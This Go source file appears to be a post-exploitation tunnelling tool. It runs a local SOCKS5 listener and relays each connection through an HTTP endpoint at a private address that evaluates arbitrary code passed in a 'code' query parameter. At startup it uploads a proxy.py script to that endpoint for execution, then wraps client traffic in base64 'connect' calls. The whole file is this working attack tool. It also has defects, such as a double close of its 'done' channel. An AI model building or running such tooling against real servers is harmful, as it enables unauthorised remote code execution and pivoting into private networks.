package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

var ServerAddr = "http://172.16.48.210:5000"

type PySocket struct {
	addr     net.Addr
	id       string
	conn     net.Conn
	done     chan struct{}
	respChan chan *http.Response
}

func NewPySocket(c net.Conn) *PySocket {
	var r [16]byte
	rand.Read(r[:])
	s := &PySocket{
		addr:     c.RemoteAddr(),
		id:       "_" + hex.EncodeToString(r[:]),
		conn:     c,
		done:     make(chan struct{}),
		respChan: make(chan *http.Response, 16),
	}
	return s
}

func (p *PySocket) Close() error {
	close(p.done)
	return p.conn.Close()
}

func main() {
	l, err := net.Listen("tcp", "127.0.0.1:2345")
	if err != nil {
		log.Fatalln(err)
	}
	Init()

	in := make(chan *PySocket, 16)

	go handler(in)

	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatalln(err)
			l.Close()
			return
		}
		py := NewPySocket(conn)
		in <- py
	}
}

func eval(code string) (resp *http.Response, err error) {
	res, err := http.Get(fmt.Sprintf("%s?code=%s", ServerAddr, code))
	if err != nil {
		log.Println("http request error:", err)
		return res, err
	}
	return res, nil
}

func Init() {
	response, err := eval(encode())
	if err != nil {
		log.Fatalln("init error:", err)
	}
	response.Body.Close()
}

func encode() string {
	readfile := "proxy.py"
	content, _ := os.ReadFile(readfile)
	encoded := strings.ReplaceAll(string(content), "\r\n", "\n")
	encoded = strings.ReplaceAll(encoded, "\n", "\\n")
	encoded = strings.ReplaceAll(encoded, "\"", "\\\"")
	fmt.Println(encoded)
	return encoded
}

func handler(in chan *PySocket) {
	for {
		select {
		case py, ok := <-in:
			if !ok {
				return // 通道已关闭，退出函数
			}
			go py.Read()
			go py.Write()
		}
	}
}

func (p *PySocket) Write() {
	buf := make([]byte, 4096)
	defer p.Close()
	defer close(p.done)
	for {
		n, err := p.conn.Read(buf)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("connection closed by remote")
				return
			} else {
				log.Println("read error:", err)
				return
			}
		}
		data := buf[:n]
		host, port := Parser(data)
		code := fmt.Sprintf("connect(%s,%s,%d,%s)", p.id, host, port, base64.StdEncoding.EncodeToString(data))
		resp, err := http.Get(fmt.Sprintf("%s?code=%s", ServerAddr, code))
		if err != nil {
			log.Println("http request error:", err)
			continue
		}
		p.respChan <- resp
	}
}

// Parser return Host and Port from data
func Parser(data []byte) (string, int) {
	if len(data) < 10 || data[0] != 0x05 {
		return "", 0 // 不是SOCKS5协议
	}

	if data[1] != 0x01 { // CMD不是CONNECT
		return "", 0
	}

	atyp := data[3]
	var addr string
	var portStart int

	switch atyp {
	case 0x01: // IPv4
		if len(data) < 10 {
			return "", 0
		}
		addr = fmt.Sprintf("%d.%d.%d.%d", data[4], data[5], data[6], data[7])
		portStart = 8
	case 0x03: // 域名
		addrLen := int(data[4])
		if len(data) < 5+addrLen+2 {
			return "", 0
		}
		addr = string(data[5 : 5+addrLen])
		portStart = 5 + addrLen
	case 0x04: // IPv6
		return "", 0 // 简化处理，先不支持IPv6
	default:
		return "", 0
	}

	port := int(data[portStart])<<8 | int(data[portStart+1])
	return addr, port
}

func (p *PySocket) Read() {
	for {
		select {
		case resp := <-p.respChan:
			data, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Println("read response body error:", err)
				continue
			}
			decoded, err := base64.StdEncoding.DecodeString(string(data))
			if err != nil {
				log.Println("base64 decode error:", err)
				continue
			}
			_, err = p.conn.Write(decoded)
			if err != nil {
				log.Println("write to conn error:", err)
				continue
			}
		case <-p.done:
			return
		}
	}
}
